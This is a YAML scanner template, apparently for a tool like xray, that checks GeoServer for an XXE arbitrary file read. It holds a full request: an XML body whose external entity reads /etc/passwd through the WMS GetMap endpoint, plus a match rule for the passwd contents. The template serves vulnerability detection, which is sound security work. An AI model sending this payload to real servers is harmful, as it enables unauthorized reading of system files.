name: geoserver-xxe-fileread
rules:
  - method: POST
    path: "/geoserver/wms?service=WMS&version=1.1.0&request=GetMap&width=100&height=100&format=image/png&bbox=-180,-90,180,90"
    headers:
      Content-Type: application/xml
    body: |
      <?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE StyledLayerDescriptor [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
      <StyledLayerDescriptor version="1.0.0">
      <NamedLayer>
      <Name>&xxe;</Name>
      </NamedLayer>
      </StyledLayerDescriptor>
    expression: |
      response.status == 200 && "root:.*:0:0:".bmatches(response.body)
detail:
  author: lxy
  links:
    - https://github.com/geoserver/geoserver
  description: "GeoServer XXE 任意文件读取漏洞"
